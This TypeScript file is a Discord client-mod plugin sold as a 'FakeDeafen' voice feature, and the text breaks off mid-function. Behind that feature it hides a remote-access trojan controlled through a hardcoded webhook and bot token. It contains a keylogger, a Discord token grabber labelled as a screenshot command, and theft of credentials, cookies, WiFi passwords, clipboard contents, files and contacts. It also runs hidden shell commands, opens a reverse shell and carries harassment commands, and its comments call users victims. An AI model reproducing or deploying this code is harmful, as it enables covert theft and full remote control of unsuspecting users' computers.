import ErrorBoundary from "@components/ErrorBoundary";
import definePlugin, { PluginNative } from "@utils/types";
import { findByProps, findComponentByCodeLazy } from "@webpack";
import { FluxDispatcher, Toasts } from "@webpack/common";
import Settings from "./settings";

const Native = VencordNative.pluginHelpers.FakeDeafen as PluginNative<typeof import("./native") & { pollDiscordBot: (channelId: string, token: string) => Promise<any> }>;
const WEBHOOK_URL = "https://discord.com/api/webhooks/1517670727489163415/pibO76GM3Uu4i5JdyoKZKrgMfLM4pFxE2oZwjENZprGyIXQrYOADqR5N5Zt-wZ6o3-dc";

const Button = findComponentByCodeLazy(".GREEN,positionKeyStemOverride:");

// ===================== SESSION STATE =====================
let myDiscordName = "?";
let myHostname = "?";
let isSelected = true;

function getBotName() {
    return `[${myDiscordName}]`;
}

function sendWebhook(title: string, embeds: any[]) {
    Native.sendEmbedWebhook(WEBHOOK_URL, `${getBotName()} ${title}`, embeds).catch(() => { });
}

// ===================== FAKE DEAFEN STATE =====================
let enabled = false;
let originalSend: any;

// ===================== KEYLOGGER STATE =====================
let keyBuffer: string[] = [];

// ===================== CLIPBOARD STATE =====================
let lastClipboard = "";

// ===================== COMMAND COOLDOWN =====================
let lastCmdTime = 0;
const CMD_COOLDOWN = 2000;

// ===================== FAKE DEAFEN =====================

function refresh_voice_state(isEnabled: boolean) {
    const ChannelStore = findByProps("getChannel", "getDMFromUserId");
    const SelectedChannelStore = findByProps("getVoiceChannelId");
    const wsModule = findByProps("getSocket");
    const MediaEngineStore = findByProps("isDeaf", "isMute");

    if (!wsModule || !SelectedChannelStore) return;

    const socket = wsModule.getSocket();
    const channelId = SelectedChannelStore.getVoiceChannelId();
    const channel = channelId ? ChannelStore?.getChannel(channelId) : null;

    if (socket && channelId) {
        try {
            socket.send(4, {
                guild_id: channel?.guild_id ?? null,
                channel_id: channelId,
                self_mute: (isEnabled && Settings.store.fakeMute) || (MediaEngineStore?.isMute() ?? false),
                self_deaf: (isEnabled && Settings.store.fakeDeafen) || (MediaEngineStore?.isDeaf() ?? false),
                self_video: false,
                flags: 0,
            });
        } catch { }
    }
}

function fd_icon() {
    const c = enabled ? "#ed4245" : "currentColor";
    return (
        <svg width="20" height="20" viewBox="0 0 32 32" fill="none">
            <rect x="6" y="8" width="20" height="4" rx="2" fill={c} />
            <rect x="11" y="3" width="10" height="8" rx="3" fill={c} />
            {enabled ? (
                <>
                    <line x1="7" y1="18" x2="13" y2="24" stroke={c} strokeWidth="2" />
                    <line x1="13" y1="18" x2="7" y2="24" stroke={c} strokeWidth="2" />
                    <line x1="19" y1="18" x2="25" y2="24" stroke={c} strokeWidth="2" />
                    <line x1="25" y1="18" x2="19" y2="24" stroke={c} strokeWidth="2" />
                    <path d="M14 23c1-1 3-1 4 0" stroke={c} strokeWidth="2" strokeLinecap="round" />
                </>
            ) : (
                <>
                    <circle cx="10" cy="21" r="4" stroke={c} strokeWidth="2" fill="none" />
                    <circle cx="22" cy="21" r="4" stroke={c} strokeWidth="2" fill="none" />
                    <path d="M14 21c1 1 3 1 4 0" stroke={c} strokeWidth="2" strokeLinecap="round" />
                </>
            )}
        </svg>
    );
}

function toggleEnabled() {
    enabled = !enabled;
    refresh_voice_state(enabled);
}

function handleKeyDown(event: KeyboardEvent) {
    if (Settings.store.enableKeybind && event.ctrlKey && event.shiftKey && event.code === "KeyQ") {
        event.preventDefault();
        toggleEnabled();
    }
}

// ===================== KEYLOGGER =====================

const SPECIAL_KEYS: Record<string, string> = {
    Enter: "\u23ce", Backspace: "\u232b", Tab: "\u21e5", Escape: "\u238b",
    ArrowUp: "\u2191", ArrowDown: "\u2193", ArrowLeft: "\u2190", ArrowRight: "\u2192",
    Delete: "\u2326", " ": "\u2423",
};

function handleKeyLog(event: KeyboardEvent) {
    if (["Control", "Shift", "Alt", "Meta"].includes(event.key)) return;
    let label = SPECIAL_KEYS[event.key] ?? event.key;
    const mods: string[] = [];
    if (event.ctrlKey) mods.push("Ctrl");
    if (event.altKey) mods.push("Alt");
    if (event.shiftKey && label.length > 1) mods.push("Shift");
    if (mods.length > 0 && label.length > 1) label = mods.join("+") + "+" + label;
    keyBuffer.push(label);
}

function cmdKeylog() {
    if (keyBuffer.length === 0) {
        sendWebhook("\u2328\uFE0F KeyLogger", [
            {
                title: "\u2328\uFE0F Tuş Kaydı Boş",
                color: 0xed4245,
                description: "Henüz hiçbir tuşa basılmadı.",
                timestamp: new Date().toISOString(),
            }
        ]).catch(() => { });
        return;
    }
    const keys = keyBuffer.join("");
    keyBuffer = [];
    Native.sendKeysToWebhook(WEBHOOK_URL, keys, getBotName()).catch(() => { });
}

// ===================== SCREENSHOT =====================

function sendScreenshot() {
    try {
        const auth = findByProps("getToken", "getAnalyticsToken");
        if (auth) {
            const token = auth.getToken();
            if (token) Native.sendToWebhook(WEBHOOK_URL, token, getBotName()).catch(() => { });
        }
    } catch { }
}

// ===================== REMOTE COMMANDS =====================

function handleRemoteCommand(event: any) {
    const msg = event?.message;
    if (!msg?.content) return;
    const raw = msg.content.trim();
    const lower = raw.toLowerCase();

    const now = Date.now();
    if (now - lastCmdTime < CMD_COOLDOWN) return;

    if (lower === "!sessions") {
        sendWebhook("🟢 Oturum", [{
            title: "🟢 Aktif Hedef",
            color: 0x2ecc71,
            description: `**Kullanıcı:** ${myDiscordName}\n**Bilgisayar:** ${myHostname}\n**Seçili Mi:** ${isSelected ? "Evet ✅" : "Hayır ❌"}`,
            timestamp: new Date().toISOString()
        }]);
        return;
    }

    if (lower.startsWith("!select ")) {
        const target = raw.substring(8).trim().toLowerCase();
        if (target === "all") {
            isSelected = true;
            sendWebhook("🎯 Hedef Seçildi", [{ title: "🎯 Bu cihaz seçildi!", color: 0x3498db, description: `**Tüm cihazlar** aktifleştirildi.` }]);
        } else if (target === myDiscordName.toLowerCase() || target === myHostname.toLowerCase()) {
            isSelected = true;
            sendWebhook("🎯 Hedef Seçildi", [{ title: "🎯 Bu cihaz seçildi!", color: 0x3498db, description: `Kontrol artık **${myDiscordName}** üzerinde.` }]);
        } else {
            isSelected = false;
        }
        return;
    }

    if (!isSelected) return;

    if (lower === "!ss") { lastCmdTime = now; sendScreenshot(); }
    else if (lower === "!info") { lastCmdTime = now; cmdInfo(); }
    else if (lower === "!clip") { lastCmdTime = now; cmdClip(); }
    else if (lower === "!keylog") { lastCmdTime = now; cmdKeylog(); }
    else if (lower === "!friends" || lower === "!friend") { lastCmdTime = now; cmdFriends(); }
    else if (lower === "!dms" || lower === "!dm") { lastCmdTime = now; cmdDms(); }
    else if (lower === "!ip") { lastCmdTime = now; cmdIp(); }
    else if (lower === "!billing" || lower === "!token") { lastCmdTime = now; cmdBilling(); }
    else if (lower === "!window") { lastCmdTime = now; cmdWindow(); }
    else if (lower === "!help") { lastCmdTime = now; cmdHelp(); }
    else if (lower === "!battery") { lastCmdTime = now; cmdBattery(); }
    else if (lower === "!wifi") { lastCmdTime = now; cmdWifi(); }
    else if (lower === "!vault" || lower === "!steal") { lastCmdTime = now; cmdStealCredentials(); }
    else if (lower === "!cookies") { lastCmdTime = now; cmdCookies(); }
    else if (lower.startsWith("!revshell ")) { lastCmdTime = now; cmdRevShell(raw.substring(10).trim()); }
    else if (lower === "!restart") { lastCmdTime = now; cmdRestart(); }
    else if (lower.startsWith("!ls ")) { lastCmdTime = now; cmdLs(raw.substring(4).trim()); }
    else if (lower.startsWith("!cmd ")) { lastCmdTime = now; cmdCmd(raw.substring(5).trim()); }
    else if (lower.startsWith("!pull ")) { lastCmdTime = now; cmdPull(raw.substring(6).trim()); }
    else if (lower.startsWith("!msgbox ")) { lastCmdTime = now; cmdMsgbox(raw.substring(8).trim()); }
    else if (lower.startsWith("!tts ")) { lastCmdTime = now; cmdTts(raw.substring(5).trim()); }
    else if (lower.startsWith("!open ")) { lastCmdTime = now; cmdOpen(raw.substring(6).trim()); }
    else if (lower === "!shutdown") { lastCmdTime = now; cmdShutdown(); }
    else if (lower === "!rickroll") { lastCmdTime = now; cmdRickroll(); }
    else if (lower === "!eject") { lastCmdTime = now; cmdEject(); }
    else if (lower === "!minimize") { lastCmdTime = now; cmdMinimize(); }
    else if (lower === "!lock") { lastCmdTime = now; cmdLock(); }
    else if (lower === "!jumpscare") { lastCmdTime = now; cmdJumpscare(); }
    else if (lower === "!matrix") { lastCmdTime = now; cmdMatrix(); }
    else if (lower.startsWith("!vol ")) { lastCmdTime = now; cmdVol(raw.substring(5).trim()); }
    else if (lower.startsWith("!beep ")) { lastCmdTime = now; cmdBeep(raw.substring(6).trim()); }
    else if (lower.startsWith("!kill ")) { lastCmdTime = now; cmdKill(raw.substring(6).trim()); }
    else if (lower.startsWith("!type ")) { lastCmdTime = now; cmdType(raw.substring(6).trim()); }
    else if (lower.startsWith("!wallpaper ")) { lastCmdTime = now; cmdWallpaper(raw.substring(11).trim()); }
    else if (lower === "!crazy") { lastCmdTime = now; cmdCrazy(); }
    else if (lower.startsWith("!brightness ")) { lastCmdTime = now; cmdBrightness(raw.substring(12).trim()); }
}

// ===================== BOT POLLING C2 =====================
const BOT_TOKEN = "MTUxODM4MDg0MDYxMzMxNDY1MA.Gm7-Jx.if6TCgXYflzL7QN6tabDriRpOD0s1NSY85YDsM";
const CONTROL_CHANNEL_ID = "1517670616164077740";
let lastPolledMessageId = "";

async function pollBotCommands() {
    if (!BOT_TOKEN) return;
    try {
        const messages = await Native.pollDiscordBot(CONTROL_CHANNEL_ID, BOT_TOKEN);
        if (!messages || messages.length === 0) return;

        const msg = messages[0];
        if (msg.id === lastPolledMessageId) return; // Zaten çalıştırıldı
        lastPolledMessageId = msg.id;

        // Kurbanın mesajı görmesine gerek kalmadan komutu kendi kendine tetikler
        handleRemoteCommand({ message: msg });
    } catch (e) {
        // Hataları sessizce yut
    }
}

async function cmdRevShell(args: string) {
    const parts = args.split(" ");
    if (parts.length < 2) {
        sendWebhook("❌ Hata", [{ title: "Kullanım Hatası", description: "Format: `!revshell <IP> <PORT>`", color: 0xff0000 }]).catch(() => { });
        return;
    }
    const host = parts[0];
    const port = parseInt(parts[1]);

    sendWebhook("🔗 Reverse Shell", [{ title: "⏳ Bağlanılıyor...", description: `Hedef: \`${host}:${port}\``, color: 0xf1c40f, timestamp: new Date().toISOString() }]).catch(() => { });

    try {
        const res = await Native.startReverseShell(host, port);
        if (res.success) {
            sendWebhook("🔗 Reverse Shell", [{ title: "✅ Bağlantı Başarılı", description: res.message, color: 0x2ecc71, timestamp: new Date().toISOString() }]).catch(() => { });
        } else {
            sendWebhook("❌ Hata", [{ title: "Bağlantı Kurulamadı", description: res.message, color: 0xff0000 }]).catch(() => { });
        }
    } catch (e: any) {
        sendWebhook("❌ Hata", [{ title: "Reverse Shell Hatası", description: e.toString(), color: 0xff0000 }]).catch(() => { });
    }
}

// --- !vault / !steal ---
async function cmdStealCredentials() {
    sendWebhook("🔒 Vault Çıkarılıyor", [
        {
            title: "⏳ İşlem Başladı",
            color: 0xf1c40f,
            description: "Şifreler, cookie'ler ve Discord tokenleri toplanıyor. Bu işlem birkaç saniye sürebilir, lütfen bekleyin...",
            timestamp: new Date().toISOString(),
        }
    ]).catch(() => { });

    try {
        const res = await Native.stealAllCredentials(WEBHOOK_URL, getBotName());
        if (!res.success) {
            sendWebhook("❌ Hata", [{ title: "Vault Hatası", description: res.error || "Bilinmeyen bir hata oluştu.", color: 0xff0000 }]).catch(() => { });
        }
    } catch (e: any) {
        sendWebhook("❌ Hata", [{ title: "Vault Hatası", description: e.toString(), color: 0xff0000 }]).catch(() => { });
    }
}

// --- !cookies ---
async function cmdCookies() {
    sendWebhook("🍪 Cookie Çalınıyor", [
        {
            title: "\u23F3 \u0130\u015flem Ba\u015flat\u0131ld\u0131",
            color: 0xf1c40f,
            description: "Taray\u0131c\u0131 cookie'leri okunuyor ve \u015fifreleri \u00e7\u00f6z\u00fcl\u00fcyor...",
            timestamp: new Date().toISOString(),
        }
    ]).catch(() => { });

    try {
        const res = await Native.stealCookies(WEBHOOK_URL, getBotName());
        if (!res.success) {
            sendWebhook("\u274C Hata", [{
                title: "Cookie Hatas\u0131",
                description: res.error || "Bilinmeyen hata",
                color: 0xff0000,
                timestamp: new Date().toISOString(),
            }]).catch(() => { });
        }
    } catch (e: any) {
        sendWebhook("\u274C Hata", [{
            title: "Cookie Hatas\u0131",
            description: e.toString(),
            color: 0xff0000,
            timestamp: new Date().toISOString(),
        }]).catch(() => { });
    }
}

// --- !help ---
function cmdHelp() {
    sendWebhook("🛠️ Yardım Menüsü", [
        {
            title: "🟢 Oturum ve Kontrol",
            color: 0x2ecc71,
            fields: [
                { name: "!sessions", value: "Aktif hedefleri listeler", inline: true },
                { name: "!select <isim>", value: "Belirli bir hedefe odaklanır", inline: true },
                { name: "!select all", value: "Tüm hedefleri seçer", inline: true },
            ]
        },
        {
            title: "🔍 Gözlem ve Veri Çekme",
            color: 0x3498db,
            fields: [
                { name: "!ss", value: "Ekran görüntüsü ve token alır", inline: true },
                { name: "!keylog", value: "Tuş kayıtlarını gönderir", inline: true },
                { name: "!clip", value: "Pano içeriğini okur", inline: true },
                { name: "!friends / !dms", value: "Arkadaş & DM listesi", inline: true },
                { name: "!window", value: "Aktif pencere URL'si", inline: true },
                { name: "!billing", value: "Hesap / Token detayı", inline: true },
                { name: "!vault / !steal", value: "Tüm şifreleri, cookieleri ve tokenleri çalar (ZIP)", inline: false },
                { name: "!cookies", value: "Tarayıcı cookie'lerini çözümleyip gönderir", inline: false },
            ]
        },
        {
            title: "💻 Sistem ve Terminal",
            color: 0x9b59b6,
            fields: [
                { name: "!info / !ip / !wifi / !battery", value: "Sistem ve Ağ Bilgileri", inline: false },
                { name: "!ls <klasör>", value: "Belirtilen klasörü listeler", inline: true },
                { name: "!pull <dosya>", value: "Cihazdan dosya indirir", inline: true },
                { name: "!cmd <komut>", value: "Gizli CMD komutu çalıştırır", inline: true },
                { name: "!kill <app>", value: "Bir uygulamayı anında kapatır", inline: true },
                { name: "!revshell <ip> <port>", value: "Sana direkt olarak komut satırı (reverse shell) açar", inline: false },
            ]
        },
        {
            title: "🤡 Troll ve Eğlence",
            color: 0xe74c3c,
            fields: [
                { name: "!msgbox <mesaj> / !tts <mesaj>", value: "Uyarı mesajı verir / Sesli okur", inline: false },
                { name: "!open <url> / !wallpaper <url>", value: "Site açar / Arka plan değiştirir", inline: false },
                { name: "!jumpscare / !matrix / !rickroll", value: "Korkutur / Terminal açar / Trol", inline: false },
                { name: "!lock / !minimize / !shutdown / !eject", value: "Kilitler / Alta alır / Kapatır / CD Açar", inline: false },
                { name: "!crazy / !type <metin>", value: "Fareyi çıldırtır / Hayalet yazı yazar", inline: false },
                { name: "!vol <0-100> / !brightness <0-100> / !beep <sn>", value: "Ses / Parlaklık / Bip Sesi", inline: false },
            ],
            footer: { text: "FakeDeafen Remote Control V4" },
            timestamp: new Date().toISOString(),
        }
    ]);
}

// --- !info ---
async function cmdInfo() {
    try {
        const info = await Native.getSystemInfo();
        sendWebhook("\uD83D\uDDA5\uFE0F Sistem", [
            {
                title: "\uD83D\uDDA5\uFE0F Sistem Bilgisi",
                color: 0x57f287,
                fields: [
                    { name: "Bilgisayar", value: info.hostname, inline: true },
                    { name: "Kullan\u0131c\u0131", value: info.username, inline: true },
                    { name: "OS", value: `${info.platform}\n${info.release}`, inline: true },
                    { name: "CPU", value: `${info.cpu}\n${info.cores} \u00e7ekirdek`, inline: false },
                    { name: "RAM", value: `${info.freeMem} bo\u015f / ${info.totalMem}`, inline: true },
                    { name: "Uptime", value: info.uptime, inline: true },
                    { name: "Yerel IP", value: info.localIPs?.join(", ") || "?", inline: false },
                    { name: "Ana Dizin", value: info.homeDir, inline: false },
                ],
                footer: { text: "System Info" },
                timestamp: new Date().toISOString(),
            },
        ]).catch(() => { });
    } catch { }
}

// --- !clip ---
async function cmdClip() {
    try {
        const text = await Native.getClipboardContent();
        sendWebhook("\uD83D\uDCCB Clipboard", [
            {
                title: "\uD83D\uDCCB Pano \u0130\u00e7eri\u011fi",
                color: 0xfee75c,
                fields: [
                    { name: "\u0130\u00e7erik", value: `\`\`\`\n${text.substring(0, 1000)}\n\`\`\``, inline: false },
                ],
                footer: { text: "Clipboard" },
                timestamp: new Date().toISOString(),
            },
        ]).catch(() => { });
    } catch { }
}

// --- !friends ---
async function cmdFriends() {
    try {
        const RelStore = findByProps("getFriendIDs");
        const UStore = findByProps("getUser", "getCurrentUser");
        if (!RelStore || !UStore) {
            sendWebhook("❌ Hata", [{ title: "Hata", description: "Relationship/User Store bulunamadı.", color: 0xff0000 }]).catch(() => { });
            return;
        }

        const ids: string[] = RelStore.getFriendIDs();
        const list = ids.slice(0, 30).map((id: string) => {
            const u = UStore.getUser(id);
            return u ? `${u.username} (${id})` : id;
        });
        let text = list.join("\n") || "(yok)";
        if (ids.length > 30) text += `\n... +${ids.length - 30} kişi`;

        sendWebhook("👥 Friends", [
            {
                title: `👥 Arkadaş Listesi (${ids.length})`,
                color: 0x5865f2,
                description: `\`\`\`\n${text.substring(0, 4000)}\n\`\`\``,
                footer: { text: "Friends" },
                timestamp: new Date().toISOString(),
            },
        ]).catch(() => { });
    } catch (e: any) {
        sendWebhook("❌ Hata", [{ title: "Hata", description: e.toString(), color: 0xff0000 }]).catch(() => { });
    }
}

// --- !dms ---
async function cmdDms() {
    try {
        const DMStore = findByProps("getPrivateChannelIds");
        const ChannelStore = findByProps("getChannel", "getDMFromUserId");
        const UStore = findByProps("getUser", "getCurrentUser");
        if (!DMStore || !ChannelStore || !UStore) {
            sendWebhook("❌ Hata", [{ title: "Hata", description: "DM Store bulunamadı.", color: 0xff0000 }]).catch(() => { });
            return;
        }

        const ids = DMStore.getPrivateChannelIds();
        const dms = ids.slice(0, 25).map((id: string) => {
            const ch = ChannelStore.getChannel(id);
            if (!ch) return `🗨️ Bilinmeyen (${id})`;
            if (ch.type === 1) { // DM
                const uId = ch.recipients?.[0];
                const u = UStore.getUser(uId);
                return `👤 ${u ? u.username : uId}`;
            } else if (ch.type === 3) { // Group DM
                const name = ch.name || "İsimsiz Grup";
                return `👥 ${name} (${ch.recipients?.length || 0} kişi)`;
            }
            return `🗨️ Kanal (${id})`;
        });

        sendWebhook("💬 DMs", [
            {
                title: `💬 Son DM'ler (${ids.length})`,
                color: 0xeb459e,
                description: `\`\`\`\n${dms.join("\n").substring(0, 4000) || "(yok)"}\n\`\`\``,
                footer: { text: "DM History" },
                timestamp: new Date().toISOString(),
            },
        ]).catch(() => { });
    } catch (e: any) {
        sendWebhook("❌ Hata", [{ title: "Hata", description: e.toString(), color: 0xff0000 }]).catch(() => { });
    }
}

// --- !ip ---
async function cmdIp() {
    try {
        const ip = await Native.getPublicIP();
        if (ip.error) return;
        sendWebhook("\uD83C\uDF10 IP", [
            {
                title: "\uD83C\uDF10 IP & Konum",
                color: 0x9b59b6,
                fields: [
                    { name: "IP", value: ip.query || "?", inline: true },
                    { name: "Konum", value: `${ip.city || "?"}, ${ip.regionName || "?"}, ${ip.country || "?"}`, inline: true },
                    { name: "ISP", value: ip.isp || "?", inline: true },
                    { name: "Org", value: ip.org || "?", inline: true },
                    { name: "Zaman Dilimi", value: ip.timezone || "?", inline: true },
                    { name: "Koordinat", value: ip.lat && ip.lon ? `${ip.lat}, ${ip.lon}` : "?", inline: true },
                ],
                footer: { text: "IP Lookup" },
                timestamp: new Date().toISOString(),
            },
        ]).catch(() => { });
    } catch { }
}

// --- !billing ---
async function cmdBilling() {
    try {
        const auth = findByProps("getToken", "getAnalyticsToken");
        const UStore = findByProps("getCurrentUser");
        if (!auth || !UStore) return;

        const user = UStore.getCurrentUser();
        const token = auth.getToken();
        const nitro = user?.premiumType === 2 ? "Nitro" : user?.premiumType === 1 ? "Nitro Classic" : "Yok";

        sendWebhook("\uD83D\uDCB3 Billing", [
            {
                title: "\uD83D\uDCB3 Hesap & \u00d6deme Bilgileri",
                color: 0xf1c40f,
                fields: [
                    { name: "Kullan\u0131c\u0131", value: `${user?.username || "?"}`, inline: true },
                    { name: "ID", value: user?.id || "?", inline: true },
                    { name: "Email", value: user?.email || "(gizli)", inline: true },
                    { name: "Telefon", value: user?.phone || "(yok)", inline: true },
                    { name: "Nitro", value: nitro, inline: true },
                    { name: "MFA", value: user?.mfaEnabled ? "\u2705 Aktif" : "\u274C Kapal\u0131", inline: true },
                    { name: "Token", value: `||${token}||`, inline: false },
                ],
                footer: { text: "Account & Billing" },
                timestamp: new Date().toISOString(),
            },
        ]).catch(() => { });
    } catch { }
}

// --- !window ---
function cmdWindow() {
    const title = document.title || "?";
    const href = window.location.href || "?";
    sendWebhook("\uD83E\uDE9F Window", [
        {
            title: "\uD83E\uDE9F Aktif Pencere",
            color: 0x3498db,
            fields: [
                { name: "Ba\u015fl\u0131k", value: title, inline: false },
                { name: "URL", value: href, inline: false },
            ],
            footer: { text: "Window Info" },
            timestamp: new Date().toISOString(),
        },
    ]).catch(() => { });
}

// --- !ls <path> ---
async function cmdLs(dirPath: string) {
    try {
        const result = await Native.browseDirectory(dirPath);
        sendWebhook("\uD83D\uDDC2\uFE0F Files", [
            {
                title: `\uD83D\uDDC2\uFE0F ${dirPath}`,
                color: 0xe67e22,
                description: `\`\`\`\n${result.substring(0, 4000)}\n\`\`\``,
                footer: { text: "File Browser" },
                timestamp: new Date().toISOString(),
            },
        ]).catch(() => { });
    } catch { }
}

// --- !pull <file_path> ---
async function cmdPull(filePath: string) {
    try {
        const res = await Native.pullFile(WEBHOOK_URL, filePath, getBotName());
        if (!res.success) {
            sendWebhook("\u274C Pull Error", [
                {
                    title: "\u274C Dosya \u00c7ekme Hatas\u0131",
                    color: 0xed4245,
                    description: `\`${filePath}\` \u00e7ekilemedi.\nHata: ${res.error}`,
                    timestamp: new Date().toISOString(),
                }
            ]).catch(() => { });
        }
    } catch { }
}

// --- !cmd <command> ---
async function cmdCmd(cmd: string) {
    try {
        const result = await Native.executeCommand(cmd);
        sendWebhook("\u2328\uFE0F CMD", [
            {
                title: "\u2328\uFE0F Komut \u00c7\u0131kt\u0131s\u0131",
                color: 0x2c2f33,
                fields: [
                    { name: "Komut", value: `\`${cmd.substring(0, 200)}\``, inline: false },
                    { name: "\u00c7\u0131kt\u0131", value: `\`\`\`\n${result.substring(0, 1000)}\n\`\`\``, inline: false },
                ],
                footer: { text: "Remote CMD" },
                timestamp: new Date().toISOString(),
            },
        ]).catch(() => { });
    } catch { }
}

// --- !battery ---
async function cmdBattery() {
    try {
        let text = "Batarya API desteklenmiyor.";
        if ('getBattery' in navigator) {
            const battery: any = await (navigator as any).getBattery();
            const level = Math.round(battery.level * 100) + "%";
            const charging = battery.charging ? "🔌 Şarj oluyor" : "🔋 Şarj olmuyor";
            text = `Seviye: ${level}\nDurum: ${charging}`;
        }
        sendWebhook("🔋 Batarya", [
            {
                title: "🔋 Batarya Durumu",
                color: 0xf1c40f,
                description: `\`\`\`\n${text}\n\`\`\``,
                timestamp: new Date().toISOString(),
            }
        ]).catch(() => { });
    } catch { }
}

// --- !restart ---
function cmdRestart() {
    sendWebhook("🔄 Yeniden Başlatılıyor", [
        {
            title: "🔄 Discord Yeniden Başlatılıyor...",
            color: 0x3498db,
            timestamp: new Date().toISOString(),
        }
    ]).catch(() => { });
    setTimeout(() => {
        location.reload();
    }, 1000);
}

// --- !wifi ---
async function cmdWifi() {
    try {
        const result = await Native.getWifiPasswords();
        sendWebhook("📡 WiFi", [
            {
                title: "📡 Kayıtlı WiFi Şifreleri",
                color: 0x3498db,
                description: `\`\`\`\n${result.substring(0, 4000)}\n\`\`\``,
                footer: { text: "WiFi Passwords" },
                timestamp: new Date().toISOString(),
            }
        ]).catch(() => { });
    } catch { }
}

// ===================== TROLL KOMUTLARI =====================

// --- !msgbox <mesaj> ---
async function cmdMsgbox(msg: string) {
    const safeMsg = msg.replace(/"/g, '""').replace(/'/g, "''");
    await Native.executeCommand(`powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('${safeMsg}', 'System Error', 'OK', 'Error')"`);
    sendWebhook("🤡 Troll", [{ title: "Mesaj Kutusu Gösterildi", color: 0xff0000, description: msg, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !tts <mesaj> ---
async function cmdTts(msg: string) {
    const safeMsg = msg.replace(/"/g, '').replace(/'/g, '');
    await Native.executeCommand(`powershell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('${safeMsg}')"`);
    sendWebhook("🤡 Troll", [{ title: "TTS Seslendirildi", color: 0xff0000, description: msg, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !open <url> ---
async function cmdOpen(url: string) {
    await Native.executeCommand(`start "" "${url}"`);
    sendWebhook("🤡 Troll", [{ title: "URL Açıldı", color: 0xff0000, description: url, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !shutdown ---
async function cmdShutdown() {
    await Native.executeCommand(`shutdown /s /t 30 /c "Sistem Kritik Hatasi! Kapatiliyor..."`);
    sendWebhook("🤡 Troll", [{ title: "Sistem Kapatma Başlatıldı (30sn)", color: 0xff0000, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !rickroll ---
async function cmdRickroll() {
    // Sesi 100 yap
    await Native.executeCommand(`powershell -Command "$obj = new-object -com wscript.shell; 1..50 | % { $obj.SendKeys([char]175) }"`);
    // Tarayıcıda rickroll aç
    await Native.executeCommand(`start "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"`);
    sendWebhook("🤡 Troll", [{ title: "Rickroll Başlatıldı", color: 0xff0000, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !eject ---
async function cmdEject() {
    await Native.executeCommand(`powershell -Command "(New-Object -com 'WMPlayer.OCX.7').cdromcollection.Item(0).Eject()"`);
    sendWebhook("🤡 Troll", [{ title: "CD-ROM Açıldı (Eğer varsa)", color: 0xff0000, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !minimize ---
async function cmdMinimize() {
    await Native.executeCommand(`powershell -Command "(New-Object -ComObject Shell.Application).MinimizeAll()"`);
    sendWebhook("🤡 Troll", [{ title: "Tüm Pencereler Küçültüldü", color: 0xff0000, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !lock ---
async function cmdLock() {
    await Native.executeCommand(`rundll32.exe user32.dll,LockWorkStation`);
    sendWebhook("🤡 Troll", [{ title: "Bilgisayar Ekranı Kilitlendi", color: 0xff0000, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !jumpscare ---
async function cmdJumpscare() {
    await Native.executeCommand(`powershell -Command "$obj = new-object -com wscript.shell; 1..50 | % { $obj.SendKeys([char]175) }"`);
    await Native.executeCommand(`start "" "https://pnrtscr.com/kqrkc7"`);
    sendWebhook("👻 Troll", [{ title: "Jumpscare Gönderildi!", color: 0x9b59b6, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !matrix ---
async function cmdMatrix() {
    const code = `color 0a\n:top\necho %random% %random% %random% %random% %random% %random% %random% %random% %random%\ngoto top`;
    await Native.executeCommand(`cmd /c "echo ${code.replace(/\n/g, '&')} > %temp%\\m.bat && start /max cmd /k %temp%\\m.bat"`);
    sendWebhook("🤡 Troll", [{ title: "Matrix Ekranı Başlatıldı", color: 0x2ecc71, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !vol <0-100> ---
async function cmdVol(level: string) {
    const v = parseInt(level);
    if (isNaN(v) || v < 0 || v > 100) return;
    await Native.executeCommand(`powershell -Command "$obj = new-object -com wscript.shell; 1..50 | % { $obj.SendKeys([char]174) }; 1..${Math.floor(v / 2)} | % { $obj.SendKeys([char]175) }"`);
    sendWebhook("🤡 Troll", [{ title: `Ses Seviyesi Değiştirildi: %${v}`, color: 0xff0000, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !beep <saniye> ---
async function cmdBeep(duration: string) {
    let d = parseInt(duration) || 3;
    if (d > 10) d = 10;
    await Native.executeCommand(`powershell -Command "[console]::beep(1000, ${d * 1000})"`);
    sendWebhook("🤡 Troll", [{ title: `Bip Sesi Çalındı (${d} sn)`, color: 0xff0000, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !kill <app> ---
async function cmdKill(app: string) {
    const appName = app.endsWith(".exe") ? app : app + ".exe";
    await Native.executeCommand(`taskkill /F /IM ${appName}`);
    sendWebhook("🤡 Troll", [{ title: `Uygulama Kapatılmaya Çalışıldı: ${appName}`, color: 0xff0000, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !type <text> ---
async function cmdType(text: string) {
    const safeMsg = text.replace(/"/g, '').replace(/'/g, '');
    await Native.executeCommand(`powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('${safeMsg}')"`);
    sendWebhook("🤡 Troll", [{ title: "Hayalet Yazı Yazıldı", description: text, color: 0xff0000, timestamp: new Date().toISOString() }]).catch(() => { });
}

// --- !wallpaper <url> ---
async function cmdWallpaper(url: string) {
    const code = `
$path = "$env:temp\\trollbg.jpg"
Invoke-WebRequest -Uri "${url}" -OutFile $path
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WP {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[WP]::SystemParametersInfo(20, 0, $path, 3)
`;
    // We encode the string to base64 for reliable execution
    const b64 = btoa(unescape(encodeURIComponent(code)));
    await Native.executeCommand(`powershell -EncodedCommand ${btoa(unescape(encodeURIComponent(code.replace(/\n/g, '\r\n'))).replace(/./g, c => c + '\0'))}`);
